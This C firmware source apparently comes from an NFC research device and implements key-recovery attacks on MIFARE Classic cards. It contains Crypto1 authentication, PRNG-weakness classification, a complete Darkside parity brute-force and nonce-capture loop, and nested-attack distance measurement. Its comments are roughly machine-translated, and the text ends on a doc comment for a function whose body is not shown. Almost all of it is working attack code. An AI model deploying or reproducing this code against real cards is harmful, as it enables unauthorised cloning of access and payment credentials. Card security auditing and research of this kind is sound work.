#include "parity.h"
#include "bsp_delay.h"
#include "hex_utils.h"

#include "mf1_toolbox.h"
#include "mf1_capture_stats.h"
#include "nfca_session.h"
#include "app_timer.h"
#include "mf1_crapto1.h"
#include "app_status.h"

#include "nrf_log.h"
#include "nrf_log_ctrl.h"
#include "nrf_log_default_backends.h"
#include "bsp_wdt.h"
#include "hw_connect.h"
#include "nrf_gpio.h"
#include "rgb_marquee.h"

// The default delay of the antenna reset
static uint32_t g_ant_reset_delay = 100;

// tag information used for this module.
static picc_14a_tag_t m_tag_info;
static picc_14a_tag_t *p_tag_info = &m_tag_info;


/**
* @brief    : Calculate the distance value of the random number, and calculate the multi -type table based on real -time
*               Official comment:x,y valid tag nonces, then prng_successor(x, nonce_distance(x, y)) = y
* @param    :msb :The random number is high, the result is completed, the pointer is completed
* @param    :lsb :The random number is low, and the result is completed
* @retval   : none
*
*/
static void nonce_distance(uint32_t *msb, uint32_t *lsb) {
    uint16_t x = 1, pos;
    uint8_t calc_ok = 0;

    for (uint16_t i = 1; i; ++i) {
        // Calculate coordinates to obtain polynomial step operation results
        pos = (x & 0xff) << 8 | x >> 8;
        // To judge the coordinates, we take out the corresponding value and set the logo bit with the value of the value
        if ((pos == *msb) & !(calc_ok >> 0 & 0x01)) {
            *msb = i;
            calc_ok |= 0x01;
        }
        if ((pos == *lsb) & !(calc_ok >> 1 & 0x01)) {
            *lsb = i;
            calc_ok |= 0x02;
        }
        // If the calculation of both values is completed, we will end the operation directly,
        // to reduce unnecessary subsequent CPU performance loss
        if (calc_ok == 0x03) {
            return;
        }
        x = x >> 1 | (x ^ x >> 2 ^ x >> 3 ^ x >> 5) << 15;
    }
}

/**
* @brief    : Calculate the step of PRNG to verify whether the random number is predictable
* If it is predictable, then DarkSide attack may be supported
* And may support Nested attack
* @param    :nonce  : Measured random number
* @retval   :   true = weak prng
*               false = hardened prng
*
*/
static bool check_lfsr_prng(uint32_t nonce) {
    // Give the initial coordinate value
    uint32_t msb = nonce >> 16;
    uint32_t lsb = nonce & 0xffff;
    //The coordinates are passed in direct operation, and the rumors are also indirectly spread by the passing parameters.
    nonce_distance(&msb, &lsb);
    return ((65535 - msb + lsb) % 65535) == 16;
}

/**
* @brief    : Re -set the field, restart the field after a certain delay
*
*/
static inline void reset_radio_field_with_delay(void) {
    pcd_14a_reader_antenna_off();
    bsp_delay_ms(g_ant_reset_delay);
    pcd_14a_reader_antenna_on();
}

/**
* @brief    : Send the MiFare instruction
* @param    :pcs     : crypto1st handle
* @param    :encrypted : Whether these data need to be encrypted by Crypto1
* @param    :cmd     : The instructions that will be sent, for example, 0x60 indicates verification A key
* @param    :data    : The data that will be sent, such as 0x03 indicates verification 1 sector
* @param    :answer  : Card response data stored array
* @param    :answer_parity  : Card response data for the stagnant school inspection storage
* @retval   : The length of the card response data, this length is the length of the bit, not the length of Byte
*
*/
static uint8_t send_cmd(struct Crypto1State *pcs, uint8_t encrypted, uint8_t cmd, uint8_t data, uint8_t *status, uint8_t *answer, uint8_t *answer_parity, uint16_t answer_max_bit) {
    // Here we set directly to static
    static uint8_t pos;
    static uint16_t len;
    static uint8_t dcmd[4];
    static uint8_t ecmd[4];
    static uint8_t par[4];

    dcmd[0] = ecmd[0] = cmd;
    dcmd[1] = ecmd[1] = data;

    crc_14a_append(dcmd, 2);

    ecmd[2] = dcmd[2];
    ecmd[3] = dcmd[3];

    len = 0;

    if (pcs && encrypted) {
        for (pos = 0; pos < 4; pos++) {
            ecmd[pos] = crypto1_byte(pcs, 0x00, 0) ^ dcmd[pos];
            par[pos] = filter(pcs->odd) ^ oddparity8(dcmd[pos]);
        }
        *status = pcd_14a_reader_bits_transfer(
                      ecmd,
                      32,
                      par,
                      answer,
                      answer_parity,
                      &len,
                      answer_max_bit
                  );
    } else {
        *status = pcd_14a_reader_bytes_transfer(
                      PCD_TRANSCEIVE,
                      dcmd,
                      4,
                      answer,
                      &len,
                      answer_max_bit
                  );
    }

    // There is a problem with communication, do not continue the next task
    if (*status != STATUS_HF_TAG_OK) {
        return len;
    }

    if (encrypted == CRYPT_ALL) {
        if (len == 8) {
            uint16_t res = 0;
            res |= (crypto1_bit(pcs, 0, 0) ^ BIT(answer[0], 0)) << 0;
            res |= (crypto1_bit(pcs, 0, 0) ^ BIT(answer[0], 1)) << 1;
            res |= (crypto1_bit(pcs, 0, 0) ^ BIT(answer[0], 2)) << 2;
            res |= (crypto1_bit(pcs, 0, 0) ^ BIT(answer[0], 3)) << 3;
            answer[0] = res;
        } else {
            for (pos = 0; pos < len % 8; pos++)
                answer[pos] = crypto1_byte(pcs, 0x00, 0) ^ answer[pos];
        }
    }

    return len;
}

/**
* @brief    : Advanced verification process
* @param    :pcs      : crypto1st handle
* @param    :uid      : Card's UID number
* @param    :blockNo  : Verified block number
* @param    :keyType  : Type type, 0x60 (A key) or 0x61 (B secret)
* @param    :ui64Key  : The U64 value of the secret of the card
* @param    :isNested : Is it currently nested verification?
* @param    :ntptr    : Store the address of NT, if it is passed into NULL, it will not be saved
* @retval   : Verification returns 0, the verification is unsuccessful to return the non -0 value
*
*/
static uint8_t authex(struct Crypto1State *pcs, uint32_t uid, uint8_t blockNo, uint8_t keyType,
    uint64_t ui64Key, uint8_t isNested, uint32_t *ntptr, bool *retry_silence) {
    static uint8_t status;                                      // tag response status
    static uint16_t len;                                        // tag response length
    static uint32_t pos, nt, ntpp;                              // Supplied tag nonce
    static const uint8_t nr[]   = { 0x12, 0x34, 0x56, 0x78 };   // Use a fixed card to random NR, which is Nonce Reader.
    uint8_t par[]               = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    uint8_t mf_nr_ar[]          = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    uint8_t answer[]            = { 0x00, 0x00, 0x00, 0x00 };
    uint8_t parity[]            = { 0x00, 0x00, 0x00, 0x00 };

    len = send_cmd(pcs, isNested, keyType, blockNo, &status, answer, parity, U8ARR_BIT_LEN(answer));
    if (len != 32) {
        NRF_LOG_INFO("No 32 data recv on send_cmd: %d\r\n", len);
        return STATUS_HF_ERR_STAT;
    }

    // Save the tag nonce (nt)
    nt = BYTES4_TO_U32(answer);

    //  ----------------------------- crypto1 create
    if (isNested) {
        crypto1_deinit(pcs);
    }

    // Init cipher with key
    crypto1_init(pcs, ui64Key);

    if (isNested == AUTH_NESTED) {
        // decrypt nt with help of new key
        nt = crypto1_word(pcs, nt ^ uid, 1) ^ nt;
    } else {
        // Load (plain) uid^nt into the cipher
        crypto1_word(pcs, nt ^ uid, 0);
    }

    // save Nt
    if (ntptr)
        *ntptr = nt;

    // Generate (encrypted) nr+parity by loading it into the cipher (Nr)
    for (pos = 0; pos < 4; pos++) {
        mf_nr_ar[pos] = crypto1_byte(pcs, nr[pos], 0) ^ nr[pos];
        par[pos] = filter(pcs->odd) ^ oddparity8(nr[pos]);
    }

    // Skip 32 bits in pseudo random generator
    nt = prng_successor(nt, 32);

    // ar+parity
    for (pos = 4; pos < 8; pos++) {
        nt = prng_successor(nt, 8);
        mf_nr_ar[pos] = crypto1_byte(pcs, 0x00, 0) ^ (nt & 0xff);
        par[pos] = filter(pcs->odd) ^ oddparity8(nt);
    }

    // A fast dictionary pass shortens only the wait after the reader's proof.
    // A silent card may still be slow, so this miss can be retried at full speed.
    uint16_t timeout = retry_silence ? pcd_14a_reader_timeout_get() : 0;
    if (timeout > 4) pcd_14a_reader_timeout_set(4);
    status = pcd_14a_reader_bits_transfer(mf_nr_ar, 64, par, answer, parity, &len, U8ARR_BIT_LEN(answer));
    if (timeout > 4) {
        pcd_14a_reader_timeout_set(timeout);
        *retry_silence = status == STATUS_HF_TAG_NO;
    }
    if (status == STATUS_HF_TAG_OK && len == 32) {
        ntpp = prng_successor(nt, 32) ^ crypto1_word(pcs, 0, 0);
        if (ntpp == BYTES4_TO_U32(answer)) {
            // Successful verification!
            return STATUS_HF_TAG_OK;
        }
    }

    // fail!
    return STATUS_MF_ERR_AUTH;
}

typedef struct {
    uint32_t source_nonce;
    uint32_t chained_nonce;
    uint8_t ciphertext[4];
    uint8_t parity[4];
    uint8_t status;
    uint8_t bits;
} mf1_observation_t;

/* Return source authentication status separately from the target response so
 * legacy commands can preserve their error codes and retry behavior. */
static uint8_t mf1_capture_observation(uint32_t uid, uint8_t source_block,
    uint8_t source_type, uint64_t source_key, uint8_t target_block,
    uint8_t target_type, bool chained, mf1_observation_t *observation) {
    struct Crypto1State cipher = {0, 0};
    uint32_t started = mf1_capture_clock();
    uint8_t status = authex(&cipher, uid, source_block, source_type, source_key,
                            AUTH_FIRST, &observation->source_nonce, NULL);
    if (status == STATUS_HF_TAG_OK && chained) {
        status = authex(&cipher, uid, source_block, source_type, source_key,
                        AUTH_NESTED, &observation->chained_nonce, NULL);
    }
    mf1_capture_stats.auth_cycles += mf1_capture_elapsed(started);
    if (status == STATUS_HF_TAG_OK) {
        started = mf1_capture_clock();
        observation->bits = send_cmd(&cipher, AUTH_NESTED, target_type, target_block,
            &observation->status, observation->ciphertext, observation->parity, 32);
        mf1_capture_stats.target_cycles += mf1_capture_elapsed(started);
    }
    crypto1_deinit(&cipher);
    return status;
}

/**
* @brief    : Selected the largest probability of NT
* @param    :tag             : Label information structure, fast selection card needs to use this structure
* @param    :block           : The key cubes that will be attacked
* @param    :keytype         : The type of key to be attacked
* @param    :nt              : The final selected NT, this NT is the most occurred, and the ranking is the highest.
* @retval The final NT value determined, if the card clock cannot be synchronized, returns the corresponding abnormal code, otherwise return hf_tag_ok
* -------------------
* Why can't you fix the random number?
* 0. The deviation of free or non -free movement in the card antenna leads to the unstable communication.
* 1. The electromagnetic environment where it is located is very complicated, resulting in the process of getting the power charging of the card to complete the communication.
* 2. The card is repaired for the loopholes for the heavy attack attack, and the card is no longer a replaceable attack set to take the same response
* 3. The environment run by this code is too frequent or interrupt, or other task scheduling is too frequent.
* As a result, the CPU cannot complete the replay attack within the same time.
* There is basically no solution in this situation. It is recommended to close the non -critical interruption and task scheduling outside this code
*/
static void darkside_reset_field(uint8_t delay_ms) {
    if (!delay_ms) {
        reset_radio_field_with_delay();
        return;
    }
    pcd_14a_reader_antenna_off();
    bsp_delay_ms(delay_ms);
    pcd_14a_reader_antenna_on();
}

static uint8_t darkside_select_nonces(picc_14a_tag_t *tag, uint8_t block, uint8_t keytype, uint32_t *nt, mf1_darkside_status_t *darkside_status, uint8_t delay_ms) {
#define NT_COUNT 15
    uint8_t tag_auth[4]         = { keytype, block, 0x00, 0x00 };
    uint8_t tag_resp[4]         = { 0x00 };
    uint8_t nt_count[NT_COUNT]  = { 0x00 };
    uint32_t nt_list[NT_COUNT]  = { 0x00 };
    uint8_t i, m, max, status;
    uint16_t len;

    crc_14a_append(tag_auth, 2);

    //Random number collection
    for (i = 0; i < NT_COUNT; i++) {
        bsp_wdt_feed();
        while (NRF_LOG_PROCESS());
        //When the antenna is reset, we must make sure
        // 1. The antenna is powered off for a long time to ensure that the card is completely powered off, otherwise the pseudo -random number generator of the card cannot be reset
        // 2. Moderate power -off time, don't be too long, it will affect efficiency, and don't be too short.
        darkside_reset_field(delay_ms);
        // After the power is completely disconnected, we will select the card quickly and compress the verification time as much as possible.
        if (pcd_14a_reader_fast_select(tag) != STATUS_HF_TAG_OK) {
            NRF_LOG_INFO("Tag can't select!\n");
            return STATUS_HF_TAG_NO;
        }
        status = pcd_14a_reader_bytes_transfer(PCD_TRANSCEIVE, tag_auth, 4, tag_resp, &len, U8ARR_BIT_LEN(tag_resp));
        // After finding the card, start collecting random numbers
        if (status != STATUS_HF_TAG_OK || len != 32) {
            NRF_LOG_INFO("Get nt failed.\n");
            return STATUS_HF_ERR_STAT;
        }
        // Converted to the type of U32 and cache
        nt_list[i] = bytes_to_num(tag_resp, 4);
        // The byte array of the conversion response is 10 in NT
        // NRF_LOG_INFO("Get nt: %"PRIu32, nt_list[i]);
    }

    // Take the random number
    for (i = 0; i < NT_COUNT; i++) {
        uint32_t nt_a = nt_list[i];
        for (m = i + 1; m < NT_COUNT; m++) {
            uint32_t nt_b = nt_list[m];
            if (nt_a == nt_b) {
                nt_count[i] += 1;
            }
        }
    }

    // Take the maximum number of times after weighting
    max = nt_count[0];
    m = 0;
    for (i = 1; i < NT_COUNT; i++) {
        if (nt_count[i] > max) {
            max = nt_count[i];
            m = i;
        }
    }

    //In the end, let's determine whether the number of MAX times is greater than 0,
    // If it is not greater than 0, it means that the clock cannot be synchronized.
    if (max == 0 || (delay_ms && delay_ms < 100 && max < 2)) {
        NRF_LOG_INFO("Can't sync nt.\n");
        *darkside_status = DARKSIDE_CANT_FIX_NT;
        return STATUS_HF_TAG_OK;
    }

    // NT is fixed successfully, the one with the highest number of times we take out
    // NRF_LOG_INFO("Sync nt: %"PRIu32", max = %d\n", nt_list[m], max);
    if (nt) *nt = nt_list[m];  // Only when the caller needs to get NT
    *darkside_status = DARKSIDE_OK;
    return STATUS_HF_TAG_OK;
}

/* Legacy serial and bounded USB/web acquisition share the RF engine. */
static const uint8_t darkside_delays[] = {100, 50, 25, 10};

typedef struct {
    uint32_t uid, nt, updated, started;
    picc_14a_tag_t tag;
    uint16_t cycles;
    uint8_t block, type, par_low, variant, parity, index, resync, delay_ms, delay_index;
    uint8_t par_list[8], ks_list[8];
    bool active, selecting, complete;
} darkside_state_t;

static darkside_state_t bounded_darkside, legacy_darkside;

void mf1_darkside_reset(void) {
    memset(&bounded_darkside, 0, sizeof(bounded_darkside));
}

static uint8_t darkside_select_profile(darkside_state_t *state, picc_14a_tag_t *tag,
                                       uint8_t block, uint8_t type, mf1_darkside_status_t *result) {
    uint8_t status = darkside_select_nonces(tag, block, type, &state->nt, result, state->delay_ms);
    if (status == STATUS_HF_TAG_OK && *result == DARKSIDE_OK) {
        state->selecting = false;
        state->active = true;
        state->index = state->resync = state->parity = state->par_low = 0;
        memset(state->par_list, 0, sizeof(state->par_list));
        memset(state->ks_list, 0, sizeof(state->ks_list));
        return status;
    }
    if (++state->delay_index == sizeof(darkside_delays)) {
        state->selecting = false;
        return status;
    }
    state->delay_ms = darkside_delays[state->delay_index];
    state->updated = app_timer_cnt_get();
    *result = DARKSIDE_IN_PROGRESS;
    return STATUS_HF_TAG_OK;
}

static uint8_t darkside_acquire(uint8_t block, uint8_t type, uint8_t action,
                                uint8_t sync_max, bool bounded, const uint8_t *expected_uid,
                                uint8_t uid_len, DarksideCore_t *dc,
                                mf1_darkside_status_t *result) {
    darkside_state_t *state = bounded ? &bounded_darkside : &legacy_darkside;
    uint32_t *led_pins = NULL;
    bool led_toggle = false;
    uint8_t status, auth[4] = {type, block, 0, 0};
    uint8_t nr_ar[8] = {0}, parity[8], response[8];
    uint16_t bits;
    *result = DARKSIDE_OK;
    if (bounded && action != 0 &&
        ((!state->active && !state->selecting && !(action == 2 && state->complete)) ||
         state->block != block || state->type != type ||
         app_timer_cnt_diff_compute(app_timer_cnt_get(), state->updated) >= APP_TIMER_TICKS(state->complete ? 60000 : 10000))) {
        mf1_darkside_reset();
        return STATUS_PAR_ERR;
    }
    if (action == 0) {
        memset(state, 0, sizeof(*state));
    }
    status = pcd_14a_reader_scan_auto(p_tag_info);
    if (status != STATUS_HF_TAG_OK) return status;
    if (bounded && (p_tag_info->uid_len != uid_len || memcmp(p_tag_info->uid, expected_uid, uid_len))) {
        mf1_darkside_reset();
        *result = DARKSIDE_TAG_CHANGED;
        return STATUS_HF_TAG_OK;
    }
    if (!bounded) {
        rgb_marquee_stop();
        set_slot_light_color(RGB_GREEN);
        led_pins = hw_get_led_array();
        for (unsigned i = 0; i < RGB_LIST_NUM; i++) nrf_gpio_pin_clear(led_pins[i]);
    }
    uint32_t uid = get_u32_tag_uid(p_tag_info);
    if (action == 0) {
        state->uid = uid;
        state->tag = *p_tag_info;
        state->started = app_timer_cnt_get();
        state->block = block;
        state->type = type;
        if (bounded) {
            state->delay_ms = darkside_delays[0];
            state->selecting = true;
            status = darkside_select_profile(state, p_tag_info, block, type, result);
            if (*result == DARKSIDE_IN_PROGRESS) return status;
        } else {
            status = darkside_select_nonces(p_tag_info, block, type, &state->nt, result, 0);
        }
        if (status != STATUS_HF_TAG_OK || *result != DARKSIDE_OK) return status;
    } else {
        if (uid != state->uid || (bounded &&
            (p_tag_info->uid_len != state->tag.uid_len ||
             memcmp(p_tag_info->uid, state->tag.uid, state->tag.uid_len) ||
             p_tag_info->sak != state->tag.sak ||
             memcmp(p_tag_info->atqa, state->tag.atqa, 2)))) {
            if (bounded) mf1_darkside_reset();
            *result = DARKSIDE_TAG_CHANGED;
            return STATUS_HF_TAG_OK;
        }
        if (action == 2) {
            state->variant++;
            state->cycles = 0;
            state->started = app_timer_cnt_get();
            state->index = state->resync = 0;
            state->parity = state->par_low;
            state->active = true;
            state->complete = false;
        } else if (state->selecting) {
            status = darkside_select_profile(state, p_tag_info, block, type, result);
            if (*result == DARKSIDE_IN_PROGRESS) return status;
            if (status != STATUS_HF_TAG_OK || *result != DARKSIDE_OK) return status;
        }
    }
    crc_14a_append(auth, 2);
    for (unsigned attempt = 0; !bounded || attempt < 8; attempt++) {
        if (bounded && (++state->cycles > 1200 ||
            app_timer_cnt_diff_compute(app_timer_cnt_get(), state->started) >= APP_TIMER_TICKS(120000))) {
            state->active = false;
            *result = DARKSIDE_EXHAUSTED;
            return STATUS_HF_TAG_OK;
        }
        bsp_wdt_feed();
        while (NRF_LOG_PROCESS());
        if (!bounded) {
            led_toggle = !led_toggle;
            if (led_toggle) nrf_gpio_pin_set(led_pins[state->index]);
            else nrf_gpio_pin_clear(led_pins[state->index]);
        }
        darkside_reset_field(state->delay_ms);
        if (pcd_14a_reader_fast_select(p_tag_info) != STATUS_HF_TAG_OK) return STATUS_HF_TAG_NO;
        status = pcd_14a_reader_bytes_transfer(PCD_TRANSCEIVE, auth, 4, response, &bits, U8ARR_BIT_LEN(response));
        if (status != STATUS_HF_TAG_OK || bits != 32) return STATUS_HF_ERR_STAT;
        if (bytes_to_num(response, 4) != state->nt) {
            if (++state->resync == sync_max) {
                state->active = false;
                if (bounded && ++state->delay_index < sizeof(darkside_delays)) {
                    state->delay_ms = darkside_delays[state->delay_index];
                    state->nt = 0;
                    state->index = state->resync = state->parity = state->par_low = 0;
                    memset(state->par_list, 0, sizeof(state->par_list));
                    memset(state->ks_list, 0, sizeof(state->ks_list));
                    state->selecting = true;
                    state->updated = app_timer_cnt_get();
                    *result = DARKSIDE_IN_PROGRESS;
                    return STATUS_HF_TAG_OK;
                }
                *result = DARKSIDE_CANT_FIX_NT;
                return STATUS_HF_TAG_OK;
            }
            continue;
        }
        nr_ar[3] = state->index ? (state->variant & 0x1f) | (state->index << 5) : state->variant;
        for (unsigned i = 0; i < 8; i++) parity[i] = (state->parity >> (7 - i)) & 1;
        bits = 0;
        pcd_14a_reader_bits_transfer(nr_ar, 64, parity, response, parity, &bits, U8ARR_BIT_LEN(response));
        state->resync = 0;
        if (bits == 32) {
            state->active = false;
            *result = DARKSIDE_LUCKY_AUTH_OK;
            return STATUS_HF_TAG_OK;
        }
        if (bits == 4) {
            if (!bounded) nrf_gpio_pin_set(led_pins[state->index]);
            if (state->index == 0) state->par_low = state->parity & 0xe0;
            state->par_list[state->index] = (state->parity * 0x0202020202ULL & 0x010884422010ULL) % 1023;
            state->ks_list[state->index] = response[0] ^ 0x05;
            if (++state->index == 8) {
                get_4byte_tag_uid(p_tag_info, dc->uid);
                num_to_bytes(state->nt, 4, dc->nt);
                memcpy(dc->par_list, state->par_list, 8);
                memcpy(dc->ks_list, state->ks_list, 8);
                nr_ar[3] &= 0x1f;
                memcpy(dc->nr, nr_ar, 4);
                memcpy(dc->ar, nr_ar + 4, 4);
                state->active = false;
                state->complete = true;
                state->updated = app_timer_cnt_get();
                return STATUS_HF_TAG_OK;
            }
            state->parity = state->par_low;
            continue;
        }
        if (state->index == 0) {
            state->parity++;
        } else {
            state->parity = ((state->parity + 1) & 0x1f) | state->par_low;
        }
        if (state->parity == (state->index ? state->par_low : 0)) {
            state->active = false;
            *result = DARKSIDE_NO_NAK_SENT;
            if (!bounded && state->index != 0) return DARKSIDE_NO_NAK_SENT;
            return STATUS_HF_TAG_OK;
        }
    }
    state->updated = app_timer_cnt_get();
    *result = DARKSIDE_IN_PROGRESS;
    return STATUS_HF_TAG_OK;
}

uint8_t darkside_recover_key(uint8_t block, uint8_t type, uint8_t first,
                             uint8_t sync_max, DarksideCore_t *dc,
                             mf1_darkside_status_t *result) {
    return darkside_acquire(block, type, first ? 0 : 2, sync_max, false, NULL, 0, dc, result);
}

/* Request: key type, block, action, UID length, full expected UID.
 * Actions: 0 = new capture, 1 = next bounded chunk, 2 = next reader nonce.
 * Reply: status byte; only status 0 is followed by the 32-byte observation. */
uint16_t mf1_darkside_step(uint16_t length, const uint8_t *data, uint8_t *output,
                          uint16_t *output_length) {
    *output_length = 0;
    if (length < 4 || (data[0] != 0x60 && data[0] != 0x61) || data[2] > 2 ||
        (data[3] != 4 && data[3] != 7 && data[3] != 10) || length != 4 + data[3]) {
        nfca_session_close();
        mf1_darkside_reset();
        return STATUS_PAR_ERR;
    }
    DarksideCore_t capture;
    mf1_darkside_status_t result;
    uint8_t status = darkside_acquire(data[1], data[0], data[2], 30, true, data + 4, data[3], &capture, &result);
    if (status != STATUS_HF_TAG_OK) {
        nfca_session_close();
        mf1_darkside_reset();
        return status;
    }
    if (result != DARKSIDE_OK && result != DARKSIDE_IN_PROGRESS) nfca_session_close();
    output[0] = result;
    *output_length = 1;
    if (result == DARKSIDE_OK) {
        memcpy(output + 1, &capture, sizeof(capture));
        *output_length += sizeof(capture);
    }
    return status;
}

/**
* @brief    : Modify the middle delay of the antenna restart
*               The longer the delay, the more you can restart certain non -standard cards, the more
*               The shorter the delay, the more you get the process of processing the antenna restart, and then deal with the follow -up business
* @param    :delay_ms   : The specific value of the delay, the unit is milliseconds
* @retval   : none
*
*/
void antenna_switch_delay(uint32_t delay_ms) {
    g_ant_reset_delay = delay_ms;
}

/**
* @brief    : Determine whether this card supports M1 verification steps
* @retval   : If support, it will return hf_tag_ok,
*              If it is not supported, returns the corresponding error code
*
*/
uint8_t check_tag_response_nt(picc_14a_tag_t *tag, uint32_t *nt) {
    struct Crypto1State mpcs            = { 0, 0 };
    struct Crypto1State *pcs            = &mpcs;
    uint8_t par_recv[4]                 = { 0x00 };
    uint8_t dat_recv[4]                 = { 0x00 };
    uint8_t status;

    // Reset card communication
    pcd_14a_reader_halt_tag();

    // We will choose a fast card, and we will be compressed to verify as much as possible
    if (pcd_14a_reader_fast_select(tag) != STATUS_HF_TAG_OK) {
        NRF_LOG_INFO("Tag can't select\r\n");
        return STATUS_HF_TAG_NO;
    }

    // Send instructions and get NT return
    *nt = send_cmd(pcs, AUTH_FIRST, PICC_AUTHENT1A, 0x03, &status, dat_recv, par_recv, U8ARR_BIT_LEN(dat_recv));
    if (*nt != 32) {
        // NRF_LOG_INFO("No 32 data recv on send_cmd: %d\n", *nt);
        return STATUS_HF_ERR_STAT;
    }
    *nt = bytes_to_num(dat_recv, 4);
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : Determine whether this card supports the label MF three verification protocols
* @retval   : If support, return hf_tag_ok, if it is not supported,
*             Then return hf_errstat
* Or other card -related communication errors, the most common thing is
* Lost card hf_tag_no and wrong status hf_errstat
*
*/
uint8_t check_std_mifare_nt_support(void) {
    uint32_t nt1 = 0;

    // Find card, search on the field
    if (pcd_14a_reader_scan_auto(p_tag_info) != STATUS_HF_TAG_OK) {
        return STATUS_HF_TAG_NO;
    }

    // Get NT and return status
    return check_tag_response_nt(p_tag_info, &nt1);
}

/**
* @brief    :Determine whether this card supports StaticNESTED attack
* @retval   : If support, return nested_tag_is_static, if it is not supported, if support, return nested_tag_is_static, if it is not supported, if it is not supported, it is not supported,
* If support, return nested_tag_is_static, if not support,
*
*/
uint8_t check_static_prng(bool *is_static) {
    uint32_t nt1, nt2;
    uint8_t status;

    // Find card, search on the field
    if (pcd_14a_reader_scan_auto(p_tag_info) != STATUS_HF_TAG_OK) {
        return STATUS_HF_TAG_NO;
    }

    // Get NT in the first wave
    status = check_tag_response_nt(p_tag_info, &nt1);
    if (status != STATUS_HF_TAG_OK) {
        return status;
    }

    // Remember to reset the place after getting completed
    // If you do not re -set the field, some cards will always provide a static NT when maintaining the function in the field
    // Therefore, resetting here is very important.
    reset_radio_field_with_delay();

    // Get NT in the second wave
    status = check_tag_response_nt(p_tag_info, &nt2);
    if (status != STATUS_HF_TAG_OK) {
        return status;
    }

    // Detect whether the random number is static
    *is_static = (nt1 == nt2);
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : Determine whether this card supports the most common, weaker, and easiest nested attack, or static, or hardnested
* @retval   : critical result
*
*/
uint8_t check_prng_type(mf1_prng_type_t *prng_type) {
    uint8_t status;
    uint32_t nt1;

    bool is_static;
    status = check_static_prng(&is_static);

    // If the judgment process is found, it is found that the StaticNested detection cannot be completed
    // Then return the state directly, no need to perform the following judgment logic.
    if (status != STATUS_HF_TAG_OK) {
        return status;
    }
    if (is_static) {
        *prng_type = PRNG_STATIC;
        return STATUS_HF_TAG_OK;
    }

    // Non -Static card, you can continue to run down logic
    // ------------------------------------

    // Before you re -operate, try a dormant label
    // to reset the state machine where it may have problems
    pcd_14a_reader_halt_tag();

    // Card search operation
    if (pcd_14a_reader_scan_auto(p_tag_info) != STATUS_HF_TAG_OK) {
        return STATUS_HF_TAG_NO;
    }

    //Get NT, just get it once
    status = check_tag_response_nt(p_tag_info, &nt1);
    if (status != STATUS_HF_TAG_OK) {
        return status;
    }

    //Calculate the effectiveness of NT
    if (check_lfsr_prng(nt1)) {
        // NRF_LOG_INFO("The tag support Nested\n");
        *prng_type = PRNG_WEAK;
    } else {
        // NRF_LOG_INFO("The tag support HardNested\n");
        // NT is unpredictable and invalid.
        *prng_type = PRNG_HARD;
    }

    // ------------------------------------
    // end

    return STATUS_HF_TAG_OK;
}

/**
* @brief    : Calculate the distance between the two random numbers
* @param    :from   : From which random number
* @param    :to     :Which random number is over
* @retval   : Distance value
*
*/
static uint32_t measure_nonces(uint32_t from, uint32_t to) {
    // Give the initial coordinate value
    uint32_t msb = from >> 16;
    uint32_t lsb = to >> 16;
    // The coordinates are passed in direct operation, and the rumors are also indirectly spread by the passing parameters.
    nonce_distance(&msb, &lsb);
    return (65535 + lsb - msb) % 65535;
}

/**
* @brief    : Intermediate value measurement
* @param    :src    :Measurement source
* @param    :length :The number of measurement sources
* @retval   : Median
*
*/
uint32_t measure_median(uint32_t *src, uint32_t length) {
    uint32_t len = length;
    uint32_t minIndex;
    uint32_t temp, i;

    if (length == 1) {
        return src[0];
    }

    for (i = 0; i < len; i++) {
        //i is the end of the sequence that has been arranged
        minIndex = i;
        for (int j = i + 1; j < len; j++) {
            if (src[j] < src[minIndex]) {
                minIndex = j;
            }
        }
        if (minIndex != i) {
            temp = src[i];
            src[i] = src[minIndex];
            src[minIndex] = temp;
        }
    }
    return src[length / 2 - 1];
}

/**
* @brief    :The distance should be measured before the Nested attack. If the distance is appropriate, you can quickly crack
* @param    :u64Key  : The U64 value of the secret of the card
* @param    :block    :Verified block number
* @param    :type     :Type type, 0x60 (A key) or 0x61 (B secret)
* @param    :distance : Final distance
* @retval   : Operating result
*
*/
static uint8_t measure_distance(uint64_t u64Key, uint8_t block, uint8_t type, uint32_t *distance) {
    struct Crypto1State mpcs = {0, 0};
    struct Crypto1State *pcs = &mpcs;
    uint32_t distances[DIST_NR] = { 0x00 };
    uint32_t uid = get_u32_tag_uid(p_tag_info);
    uint32_t nt1, nt2;
    uint8_t index = 0;

    do {
        // Reset card communication
        pcd_14a_reader_halt_tag();
        // We will choose a fast card, and we will be compressed to verify as much as possible
        if (pcd_14a_reader_fast_select(p_tag_info) != STATUS_HF_TAG_OK) {
            NRF_LOG_INFO("Tag can't select\r\n");
            return STATUS_HF_TAG_NO;
        }
        // Perform the first verification in order to obtain the unblocked NT1
        if (authex(pcs, uid, block, type, u64Key, AUTH_FIRST, &nt1, NULL) != STATUS_HF_TAG_OK) {
            NRF_LOG_INFO("Auth failed 1\r\n");
            return STATUS_MF_ERR_AUTH;
        }
        // Met the nested verification to obtain the encrypted NT2_ENC
        if (authex(pcs, uid, block, type, u64Key, AUTH_NESTED, &nt2, NULL) != STATUS_HF_TAG_OK) {
            NRF_LOG_INFO("Auth failed 2\r\n");
            return STATUS_MF_ERR_AUTH;
        }
        // Determine whether the two random numbers are the same, under normal circumstances,
        // We can't bring the same random number, because PRNG is updating chip at any time
        // If you really encounter the same NT, then it can only be explained that this card is a ST card for special firmware
        if (nt1 == nt2) {
            NRF_LOG_INFO("StaticNested: %08x vs %08x\n", nt1, nt2);
            *distance = 0;
            return STATUS_HF_TAG_OK;
        }
        // After the measurement is completed, store in the buffer
        distances[index++] = measure_nonces(nt1, nt2);
        // NRF_LOG_INFO("dist = %"PRIu32"\n\n", distances[index - 1]);
    } while (index < DIST_NR);

//The final calculation of the distance between the two NTs and spread it directly
    *distance =  measure_median(distances, DIST_NR);
// You need to return the OK value to successfully log in
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : Nested core, used to collect random numbers. This function is only responsible for collecting, not responsible for conversion and analysis as KS
* @param    :pnc         :Nested core structure, save related communication data
* @param    :keyKnown    : The U64 value of the known secret key of the card
* @param    :blkKnown    :The owner of the known secret key of the card
* @param    :typKnown    : Types of the known secret key of the card, 0x60 (A secret) or 0x61 (B secret)
* @param    :targetBlock : The target sector that requires a Nested attack
* @param    :targetType  :The target key type requires the Nested attack
* @retval   : Successfully return hf_tag_ok, verify the unsuccessful return of the non -hf_tag_ok value
*
*/
